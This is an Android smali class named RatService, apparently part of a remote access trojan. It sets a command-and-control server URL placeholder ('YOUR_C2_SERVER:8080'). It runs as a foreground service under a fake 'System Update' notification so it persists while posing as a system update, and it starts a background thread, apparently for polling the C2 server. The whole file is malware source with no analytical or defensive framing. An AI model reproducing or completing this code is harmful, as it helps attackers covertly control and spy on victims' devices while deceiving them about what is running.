.class public Lcom/test/rat/RatService;
.super Landroid/app/Service;
.source "RatService.java"

.field private handler:Landroid/os/Handler;
.field private C2_URL:Ljava/lang/String;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onCreate()V
    .registers 3
    
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    
    const-string v0, "http://YOUR_C2_SERVER:8080"
    iput-object v0, p0, Lcom/test/rat/RatService;->C2_URL:Ljava/lang/String;
    
    # Foreground notification
    new-instance v0, Landroid/app/Notification$Builder;
    const-string v1, "system"
    invoke-direct {v0, p0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V
    
    const-string v1, "System Update"
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    
    const-string v1, "Checking for updates..."
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    
    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;
    move-result-object v0
    
    const/4 v1, 0x1
    invoke-virtual {p0, v1, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
    
    # Start polling thread
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/test/rat/RatService$1;
    invoke-direct {v1, p0}, Lcom/test/rat/RatService$1;-><init>(Lcom/test/rat/RatService;)V
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 2
    const/4 v0, 0x0
    return-object v0
.end method

.method static synthetic access$000(Lcom/test/rat/RatService;)Ljava/lang/String;
    .registers 1
    iget-object v0, p0, Lcom/test/rat/RatService;->C2_URL:Ljava/lang/String;
    return-object v0
.end method